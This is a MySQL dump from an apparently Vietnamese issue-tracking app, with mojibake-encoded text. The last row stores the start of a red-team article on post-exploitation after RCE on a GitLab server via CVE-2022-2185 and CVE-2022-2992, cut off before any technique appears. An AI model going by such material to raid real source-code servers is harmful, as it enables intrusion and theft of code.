  `ModifiedDate` datetime DEFAULT NULL,
  `DesiredDate` datetime DEFAULT NULL COMMENT 'Thß╗¥i hß║ín mong muß╗æn',
  `IssueStatus` int DEFAULT NULL,
  `SolutionID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PreliminarySolution` text COLLATE utf8mb4_unicode_ci COMMENT 'Giß║úi ph├íp s╞í bß╗Ö',
  `ProjectID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ProjectVersionID` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `IssueTypeID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Priority` smallint DEFAULT NULL,
  `IsClosed` tinyint(1) DEFAULT NULL,
  `FixVersionID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `AcceptStatus` tinyint(1) DEFAULT NULL,
  PRIMARY KEY (`IssueID`),
  UNIQUE KEY `IssueKey` (`IssueKey`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng c├íc vß║Ñn ─æß╗ü dß╗▒ ├ín';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `issue`
--

LOCK TABLES `issue` WRITE;
/*!40000 ALTER TABLE `issue` DISABLE KEYS */;
INSERT INTO `issue` VALUES ('2c2d2c83-c45f-403e-9b8e-24678dffa8c7',12,'Vß║Ñn ─æß╗ü vß╗ü hß║íng mß╗Ñc D',NULL,'a709c362-2cb1-4188-8490-d0832874f3a0',NULL,'53da58f8-ef0d-11ed-ae2b-0242ac130002','848e4747-13c6-11ee-b55a-0242ac130002','2023-07-31 17:46:55','2023-08-03 12:07:57',NULL,1,NULL,NULL,'dcb94c92-1048-11ee-98af-0242ac130002',NULL,'3a637580-23ad-11ee-9412-0242ac130002',NULL,NULL,NULL,NULL),('3fa85f64-5717-4562-b3fc-2c963f66afa6',2,'string','string','3fa85f64-5717-4562-b3fc-2c963f66afa6','2023-07-24 07:23:18','53da58f8-ef0d-11ed-ae2b-0242ac130002','3fa85f64-5717-4562-b3fc-2c963f66afa6','2023-07-24 14:50:29',NULL,'2023-07-24 07:23:18',1,NULL,'string','3fa85f64-5717-4562-b3fc-2c963f66afa6','3fa85f64-5717-4562-b3fc-2c963f66afa6',NULL,NULL,NULL,NULL,NULL),('4871313f-473a-45db-b682-90955e4c60b7',13,'Vß║Ñn ─æß╗ü xß╗¡ l├╜ dß╗» liß╗çu d╞░ thß╗½a cß╗ºa kh├ích h├áng','Dß╗» liß╗çu d╞░ thß╗½a cß║ºn xo├í','eec88703-d69e-4dce-90e6-1a5c5b5db39b',NULL,'ddc7a9f4-13b9-11ee-b55a-0242ac130002','848e4747-13c6-11ee-b55a-0242ac130002','2023-07-31 17:59:28','2023-08-03 12:08:05',NULL,1,NULL,NULL,'dcb94c92-1048-11ee-98af-0242ac130002',NULL,'3a636a88-23ad-11ee-9412-0242ac130002',NULL,NULL,NULL,NULL),('4d4099db-2bfe-4278-a665-58ddca606976',4,'Test','X','dcd6e555-17dc-4620-bcab-f0a6712b06f9',NULL,'53da58f8-ef0d-11ed-ae2b-0242ac130002','53da58f8-ef0d-11ed-ae2b-0242ac130002','2023-07-24 23:55:59',NULL,NULL,1,NULL,'D','9a78db36-1048-11ee-98af-0242ac130002',NULL,NULL,NULL,NULL,NULL,NULL),('50ad2218-33f9-4b23-b3e6-e08885cd18e7',3,'Y├¬u cß║ºu cß║úi tiß║┐n th├¬m v├ái chß╗⌐c n─âng tool lß║Ñy dß╗» liß╗çu ph├▓ng HTKH','M├┤ tß║ú',NULL,NULL,'53da58f8-ef0d-11ed-ae2b-0242ac130002','848e4747-13c6-11ee-b55a-0242ac130002','2023-07-24 23:49:59','2023-08-01 07:28:15','2023-07-30 16:33:13',1,NULL,'a','dcb94c92-1048-11ee-98af-0242ac130002',NULL,'3a63720a-23ad-11ee-9412-0242ac130002',2,NULL,NULL,NULL),('8a9c9be8-29d6-11ee-8172-0242ac130002',1,'abc',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),('e78fef95-ed90-478d-93f2-591c5df2c409',11,'Vß║Ñn ─æß╗ü CA','Vß║Ñn ─æß╗ü C c├│ thß╗â xß╗¡ l├╜ trong tuß║ºn sau','aaa07588-55ec-48de-b05c-d7117ba33e72',NULL,'53da58f8-ef0d-11ed-ae2b-0242ac130002','53da58f8-ef0d-11ed-ae2b-0242ac130002','2023-07-31 17:28:06','2023-08-07 09:49:28',NULL,1,NULL,NULL,'dcb94c92-1048-11ee-98af-0242ac130002',NULL,'3a636a88-23ad-11ee-9412-0242ac130002',1,NULL,NULL,NULL),('fedb973b-aca6-4573-8819-ad4f2b6d767e',5,'Test','X','3628e794-f609-4e83-be12-2e438a2665f2',NULL,'53da58f8-ef0d-11ed-ae2b-0242ac130002','53da58f8-ef0d-11ed-ae2b-0242ac130002','2023-07-25 00:22:58',NULL,NULL,1,NULL,'D','9a78db36-1048-11ee-98af-0242ac130002',NULL,NULL,NULL,NULL,NULL,NULL);
/*!40000 ALTER TABLE `issue` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `issueactivity`
--

DROP TABLE IF EXISTS `issueactivity`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `issueactivity` (
  `ActivityID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `IssueID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `Column` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `OldValue` text COLLATE utf8mb4_unicode_ci,
  `NewValue` text COLLATE utf8mb4_unicode_ci,
  `Type` smallint DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `OldContent` text COLLATE utf8mb4_unicode_ci,
  `NewContent` text COLLATE utf8mb4_unicode_ci,
  `ValueID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`ActivityID`),
  KEY `FK_issueactivity_IssueID` (`IssueID`),
  CONSTRAINT `FK_issueactivity_IssueID` FOREIGN KEY (`IssueID`) REFERENCES `issue` (`IssueID`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng c├íc hoß║ít ─æß╗Öng cß╗ºa vß║Ñn ─æß╗ü';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `issueactivity`
--

LOCK TABLES `issueactivity` WRITE;
/*!40000 ALTER TABLE `issueactivity` DISABLE KEYS */;
INSERT INTO `issueactivity` VALUES ('20ea481d-3002-11ee-a453-0242ac130002','50ad2218-33f9-4b23-b3e6-e08885cd18e7','IssueComment',NULL,'─É├ú cß║¡p nhß║¡t b├¼nh luß║¡n',1,'2023-08-01 07:26:59','B-1179',NULL,'─É├ú cß║¡p nhß║¡t b├¼nh luß║¡n','da109585-e13e-49c4-9902-cf1616cd66ed'),('2792c818-3002-11ee-a453-0242ac130002','50ad2218-33f9-4b23-b3e6-e08885cd18e7','IssueFile',NULL,'Desktop.png',1,'2023-08-01 07:27:10','B-1179',NULL,'Desktop.png','00000000-0000-0000-0000-000000000000'),('521cb225-2f91-11ee-8c2d-0242ac130002','4871313f-473a-45db-b682-90955e4c60b7','Issue',NULL,NULL,1,'2023-07-31 17:59:28','B-1160',NULL,NULL,NULL),('9116e9ac-2f8f-11ee-8c2d-0242ac130002','2c2d2c83-c45f-403e-9b8e-24678dffa8c7','Issue',NULL,NULL,1,'2023-07-31 17:46:55','B-1179',NULL,NULL,NULL),('bbe7f484-2a46-11ee-8172-0242ac130002','fedb973b-aca6-4573-8819-ad4f2b6d767e','Issue',NULL,NULL,1,'2023-07-25 00:22:58','B-1179',NULL,NULL,NULL),('f0685bc4-2f8c-11ee-8c2d-0242ac130002','e78fef95-ed90-478d-93f2-591c5df2c409','Issue',NULL,NULL,1,'2023-07-31 17:28:07','B-1179',NULL,NULL,NULL);
/*!40000 ALTER TABLE `issueactivity` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `issuecomment`
--

DROP TABLE IF EXISTS `issuecomment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `issuecomment` (
  `CommentID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `IssueID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Content` text COLLATE utf8mb4_unicode_ci,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `ModifiedDate` datetime DEFAULT NULL,
  PRIMARY KEY (`CommentID`),
  KEY `FK_issuecomment_IssueID` (`IssueID`),
  CONSTRAINT `FK_issuecomment_IssueID` FOREIGN KEY (`IssueID`) REFERENCES `issue` (`IssueID`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng b├¼nh luß║¡n c├íc vß║Ñn ─æß╗ü';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `issuecomment`
--

LOCK TABLES `issuecomment` WRITE;
/*!40000 ALTER TABLE `issuecomment` DISABLE KEYS */;
INSERT INTO `issuecomment` VALUES ('da109585-e13e-49c4-9902-cf1616cd66ed','50ad2218-33f9-4b23-b3e6-e08885cd18e7','─É├ú cß║¡p nhß║¡t b├¼nh luß║¡n','2023-08-01 07:26:59','B-1179',NULL);
/*!40000 ALTER TABLE `issuecomment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `issuefile`
--

DROP TABLE IF EXISTS `issuefile`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `issuefile` (
  `IssueFileID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `IssueID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `FileID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedBy` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  PRIMARY KEY (`IssueFileID`),
  KEY `FK_issuefile_IssueID` (`IssueID`),
  CONSTRAINT `FK_issuefile_IssueID` FOREIGN KEY (`IssueID`) REFERENCES `issue` (`IssueID`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng file vß║Ñn ─æß╗ü';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `issuefile`
--

LOCK TABLES `issuefile` WRITE;
/*!40000 ALTER TABLE `issuefile` DISABLE KEYS */;
INSERT INTO `issuefile` VALUES ('278b9d13-3002-11ee-a453-0242ac130002','50ad2218-33f9-4b23-b3e6-e08885cd18e7','278b875f-3002-11ee-a453-0242ac130002','B-1179','2023-08-01 07:27:10'),('bbe3ffb5-2a46-11ee-8172-0242ac130002','fedb973b-aca6-4573-8819-ad4f2b6d767e','bbe3e923-2a46-11ee-8172-0242ac130002','B-1179','2023-07-25 00:22:58'),('f062c34d-2f8c-11ee-8c2d-0242ac130002','e78fef95-ed90-478d-93f2-591c5df2c409','f06281ec-2f8c-11ee-8c2d-0242ac130002','B-1179','2023-07-31 17:28:06');
/*!40000 ALTER TABLE `issuefile` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `issuephase`
--

DROP TABLE IF EXISTS `issuephase`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `issuephase` (
  `IssuePhaseID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `IssueID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PhaseID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`IssuePhaseID`),
  KEY `FK_issuephase_PhaseID` (`PhaseID`),
  CONSTRAINT `FK_issuephase_PhaseID` FOREIGN KEY (`PhaseID`) REFERENCES `phase` (`PhaseID`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `issuephase`
--

LOCK TABLES `issuephase` WRITE;
/*!40000 ALTER TABLE `issuephase` DISABLE KEYS */;
INSERT INTO `issuephase` VALUES ('63254950-34ef-11ee-8171-0242ac130002','e78fef95-ed90-478d-93f2-591c5df2c409','16ea8282-cfe3-47f2-8853-545e27c713ba','2023-08-07 13:55:26','B-1179');
/*!40000 ALTER TABLE `issuephase` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `issuerelate`
--

DROP TABLE IF EXISTS `issuerelate`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `issuerelate` (
  `IssueRelateID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `IssueID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `EmployeeID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`IssueRelateID`),
  KEY `FK_issuerelate_IssueID` (`IssueID`),
  CONSTRAINT `FK_issuerelate_IssueID` FOREIGN KEY (`IssueID`) REFERENCES `issue` (`IssueID`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `issuerelate`
--

LOCK TABLES `issuerelate` WRITE;
/*!40000 ALTER TABLE `issuerelate` DISABLE KEYS */;
INSERT INTO `issuerelate` VALUES ('862e96ab-fc85-474e-af88-2a0b7414c72f','e78fef95-ed90-478d-93f2-591c5df2c409','848e4747-13c6-11ee-b55a-0242ac130002','2023-07-31 17:28:07','B-1179');
/*!40000 ALTER TABLE `issuerelate` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `issuesolution`
--

DROP TABLE IF EXISTS `issuesolution`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `issuesolution` (
  `SolutionID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `SolutionName` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Description` text COLLATE utf8mb4_unicode_ci,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `SolutionCode` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `SortOrder` int DEFAULT NULL,
  `ProjectID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`SolutionID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Giß║úi ph├íp cß╗ºa vß║Ñn ─æß╗ü';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `issuesolution`
--

LOCK TABLES `issuesolution` WRITE;
/*!40000 ALTER TABLE `issuesolution` DISABLE KEYS */;
INSERT INTO `issuesolution` VALUES ('058e7cae-2f5c-11ee-8c2d-0242ac130002','Tß╗½ chß╗æi do kh├┤ng thß╗â ─æ├íp ß╗⌐ng','Tß╗½ chß╗æi do kß╗╣ thuß║¡t phß╗⌐c tß║íp, kh├┤ng thß╗â ─æ├íp ß╗⌐ng','2023-07-24 00:00:00','B-1179','Refuse_2',4,'00000000-0000-0000-0000-000000000000'),('06ddde26-2f5b-11ee-8c2d-0242ac130002','─É├ú sß╗¡a lß╗ùi','─É├ú sß╗¡a lß╗ùi','2023-07-24 00:00:00','B-1179','Fix_Error',1,'00000000-0000-0000-0000-000000000000'),('4ebe0897-2f5b-11ee-8c2d-0242ac130002','─É├ú khß║»c phß╗Ñc tß║ím','─É├ú khß║»c phß╗Ñc tß║ím','2023-07-24 00:00:00','B-1179','Fix_Temp',2,'00000000-0000-0000-0000-000000000000'),('bd7705db-2f5b-11ee-8c2d-0242ac130002','Tß╗½ chß╗æi v├¼ y├¬u cß║ºu kh├┤ng hß╗úp l├╜','Tß╗½ chß╗æi xß╗¡ l├╜ hoß║╖c ph├ít triß╗ân do y├¬u cß║ºu kh├┤ng hß╗úp l├╜','2023-07-24 00:00:00','B-1179','Refuse_1',3,'00000000-0000-0000-0000-000000000000');
/*!40000 ALTER TABLE `issuesolution` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `issuetype`
--

DROP TABLE IF EXISTS `issuetype`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `issuetype` (
  `IssueTypeID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `IssueTypeName` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Description` text COLLATE utf8mb4_unicode_ci,
  `CreatedBy` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `SortOrder` int DEFAULT NULL,
  `ProjectID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Avatar` text COLLATE utf8mb4_unicode_ci,
  PRIMARY KEY (`IssueTypeID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng ph├ón loß║íi vß║Ñn ─æß╗ü dß╗▒ ├ín';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `issuetype`
--

LOCK TABLES `issuetype` WRITE;
/*!40000 ALTER TABLE `issuetype` DISABLE KEYS */;
INSERT INTO `issuetype` VALUES ('3a633891-23ad-11ee-9412-0242ac130002','Lß╗ùi phß║ºn mß╗üm','Lß╗ùi phß║ºn mß╗üm cß║ºn khß║»c phß╗Ñc','B-1179','2023-07-16 14:49:01',1,'dcb94c92-1048-11ee-98af-0242ac130002','https://mpsstorage20.blob.core.windows.net/mpsresource/virus.png'),('3a636a88-23ad-11ee-9412-0242ac130002','Hß╗ù trß╗ú dß╗» liß╗çu/─É─âng nhß║¡p/Kß║┐t nß╗æi','H├╡ trß╗ú dß╗» liß╗çu cho kh├ích h├áng, hß╗ù trß╗ú kh├ích h├áng c├ích ─æ─âng nhß║¡p hoß║╖c kß║┐t nß╗æi ß╗⌐ng dß╗Ñng','B-1179','2023-07-16 14:49:01',2,'dcb94c92-1048-11ee-98af-0242ac130002','https://mpsstorage20.blob.core.windows.net/mpsresource/customer-service.png'),('3a63720a-23ad-11ee-9412-0242ac130002','Y├¬u cß║ºu ph├ít triß╗ân','Y├¬u cß║ºu ph├ít triß╗ân th├¬m chß╗⌐c n─âng cß╗ºa ß╗⌐ng dß╗Ñng','B-1179','2023-07-16 14:49:01',3,'dcb94c92-1048-11ee-98af-0242ac130002','https://mpsstorage20.blob.core.windows.net/mpsresource/add.png'),('3a637580-23ad-11ee-9412-0242ac130002','Kh├íc','Vß║Ñn ─æß╗ü kh├íc','B-1179','2023-07-16 14:49:01',99,'00000000-0000-0000-0000-000000000000','https://mpsstorage20.blob.core.windows.net/mpsresource/other.png');
/*!40000 ALTER TABLE `issuetype` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `issuewatcher`
--

DROP TABLE IF EXISTS `issuewatcher`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `issuewatcher` (
  `IssueWatcherID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `IssueID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `EmployeeID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  PRIMARY KEY (`IssueWatcherID`),
  KEY `FK_issuewatcher_IssueID` (`IssueID`),
  CONSTRAINT `FK_issuewatcher_IssueID` FOREIGN KEY (`IssueID`) REFERENCES `issue` (`IssueID`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Ng╞░ß╗¥i theo d├╡i vß║Ñn ─æß╗ü';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `issuewatcher`
--

LOCK TABLES `issuewatcher` WRITE;
/*!40000 ALTER TABLE `issuewatcher` DISABLE KEYS */;
INSERT INTO `issuewatcher` VALUES ('7532b312-5cb9-4e2a-956e-dc1c4b777ad9','4871313f-473a-45db-b682-90955e4c60b7','ddc7a9f4-13b9-11ee-b55a-0242ac130002','2023-07-31 17:59:43'),('9bb83939-39e2-45d9-be85-1e3a992b0dfd','e78fef95-ed90-478d-93f2-591c5df2c409','53da58f8-ef0d-11ed-ae2b-0242ac130002','2023-07-31 18:13:26'),('aca2174a-28c8-4a0d-bf89-aea63c03cf53','50ad2218-33f9-4b23-b3e6-e08885cd18e7','53da58f8-ef0d-11ed-ae2b-0242ac130002','2023-08-01 07:28:24');
/*!40000 ALTER TABLE `issuewatcher` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `performer`
--

DROP TABLE IF EXISTS `performer`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `performer` (
  `PerformerID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `ProjectID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`PerformerID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng ng╞░ß╗¥i thß╗▒c hiß╗çn ';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `performer`
--

LOCK TABLES `performer` WRITE;
/*!40000 ALTER TABLE `performer` DISABLE KEYS */;
/*!40000 ALTER TABLE `performer` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `phase`
--

DROP TABLE IF EXISTS `phase`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `phase` (
  `PhaseID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `ProjectID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `StartDate` datetime DEFAULT NULL,
  `EndDate` datetime DEFAULT NULL,
  `Description` text COLLATE utf8mb4_unicode_ci,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatorID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PhaseName` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`PhaseID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `phase`
--

LOCK TABLES `phase` WRITE;
/*!40000 ALTER TABLE `phase` DISABLE KEYS */;
INSERT INTO `phase` VALUES ('16ea8282-cfe3-47f2-8853-545e27c713ba','dcb94c92-1048-11ee-98af-0242ac130002','2023-08-10 00:00:00','2023-08-30 00:00:00','─É├óy l├á giai ─æoß║ín thß╗¡ nghiß╗çm','2023-08-07 11:40:29','53da58f8-ef0d-11ed-ae2b-0242ac130002','Giai ─æoß║ín 2'),('e520a8b3-a393-49ad-8e52-9924f0f87828','dcb94c92-1048-11ee-98af-0242ac130002','2023-08-15 00:00:00','1970-01-01 07:00:00','ADC','2023-08-07 11:45:01','53da58f8-ef0d-11ed-ae2b-0242ac130002','Giai ─æoß║ín 3');
/*!40000 ALTER TABLE `phase` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `post`
--

DROP TABLE IF EXISTS `post`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `post` (
  `PostID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `ProjectID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `AuthorID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Content` text COLLATE utf8mb4_unicode_ci,
  `PostCategoryID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `ModifiedDate` datetime DEFAULT NULL,
  `Title` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`PostID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng c├íc b├ái viß║┐t tri thß╗⌐c';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `post`
--

LOCK TABLES `post` WRITE;
/*!40000 ALTER TABLE `post` DISABLE KEYS */;
INSERT INTO `post` VALUES ('05d54df1-72cc-4cc9-964a-4383ef986522','dcb94c92-1048-11ee-98af-0242ac130002','ddc7a9f4-13b9-11ee-b55a-0242ac130002','<p>Mß╗ùi khi t&igrave;m ─æ╞░ß╗úc mß╗Öt lß╗ù hß╗òng bß║úo mß║¡t, nhiß╗çm vß╗Ñ cß╗ºa Pentester th╞░ß╗¥ng l&agrave; sß║╜ report lß╗ùi cho ─æß╗Öi Developer ─æß╗â t&igrave;m c&aacute;ch fix lß╗ù hß╗òng ─æ&oacute;. Tuy nhi&ecirc;n, vß╗¢i nhß╗»ng kß║╗ tß║Ñn c&ocirc;ng c&oacute; chß╗º ─æ&iacute;ch hoß║╖c ─æß╗Öi Redteam, viß╗çc ph&aacute;t hiß╗çn lß╗ù hß╗òng d&ugrave; l&agrave; RCE kh&ocirc;ng c&oacute; &yacute; ngh─⌐a nß║┐u nh╞░ n&oacute; kh&ocirc;ng mang lß║íi kß║┐t quß║ú g&igrave; sau ─æ&oacute;, nh╞░ lß║Ñy ─æ╞░ß╗úc data quan trß╗ìng, ─æi s&acirc;u h╞ín v&agrave;o hß╗ç thß╗æng, l&agrave;m b&agrave;n ─æß║íp ─æß╗â tß║Ñn c&ocirc;ng server ngang h&agrave;ng, v.v...</p>\n<p>Trong series&nbsp;<strong>\"L&agrave;m g&igrave; khi ─æ&atilde; chiß║┐m ─æ╞░ß╗úc quyß╗ün ─æiß╗üu khiß╗ân hß╗ç thß╗æng\"</strong>, m&igrave;nh sß║╜ tr&igrave;nh b&agrave;y vß╗ü nhß╗»ng c&aacute;ch thß╗⌐c mß╗Öt attacker c&oacute; thß╗â sß╗¡ dß╗Ñng hß╗ç thß╗æng ─æ&atilde; bß╗ï kiß╗âm so&aacute;t ─æß╗â ─æß║ít ─æ╞░ß╗úc mß╗Ñc ─æ&iacute;ch cuß╗æi c&ugrave;ng.</p>\n<p>Trong phß║ºn 1, ta sß║╜ t&igrave;m hiß╗âu vß╗ü nhß╗»ng ─æiß╗üu c&oacute; thß╗â l&agrave;m khi ─æ&atilde; chiß║┐m ─æ╞░ß╗úc server quß║ún l&yacute; source code nh╞░ gitlab, bitbucket, ... gß╗ìi chung l&agrave;&nbsp;<strong>Source code management</strong>&nbsp;(SCM). Vß╗¢i v&iacute; dß╗Ñ cß╗Ñ thß╗â m&igrave;nh sß║╜ tr&igrave;nh b&agrave;y li&ecirc;n quan ─æß║┐n&nbsp;<strong>Gitlab</strong> - hß╗ç thß╗æng self-hosted m&atilde; nguß╗ôn mß╗ƒ dß╗▒a tr&ecirc;n hß╗ç thß╗æng m&aacute;y chß╗º Git d&ugrave;ng ─æß╗â quß║ún l&yacute; m&atilde; nguß╗ôn.</p>\n<p>&nbsp;</p>\n<p>─Éiß╗üu ch&uacute;ng ta th╞░ß╗¥ng l&agrave;m khi ─æ&atilde; RCE ─æ╞░ß╗úc hß╗ç thß╗æng SCM ch&iacute;nh l&agrave; lß║Ñy ra to&agrave;n bß╗Ö m&atilde; nguß╗ôn ─æß╗â phß╗Ñc vß╗Ñ qu&aacute; tr&igrave;nh audit code. Vß╗¢i mß╗Öt tr╞░ß╗¥ng hß╗úp cß╗Ñ thß╗â cß╗ºa m&igrave;nh, m&igrave;nh ─æ&atilde; RCE ─æ╞░ß╗úc mß╗Öt hß╗ç thß╗æng gitlab bß║▒ng 2 CVE:&nbsp;<strong>CVE-2022-2185</strong>&nbsp;v&agrave;&nbsp;<strong>CVE-2022-2992</strong>. Chi tiß║┐t h╞ín th&igrave; c&aacute;c bß║ín c&oacute; thß╗â ─æß╗ìc nhß╗»ng b&agrave;i ph&acirc;n t&iacute;ch vß╗ü 2 CVE n&agrave;y tr&ecirc;n mß║íng, m&igrave;nh xin kh&ocirc;ng ─æi s&acirc;u. ─Éiß╗üu m&igrave;nh muß╗æn n&oacute;i l&agrave; qu&aacute; tr&igrave;nh sau ─æ&oacute;.</p>\n<p>─Éß║ºu ti&ecirc;n m&igrave;nh 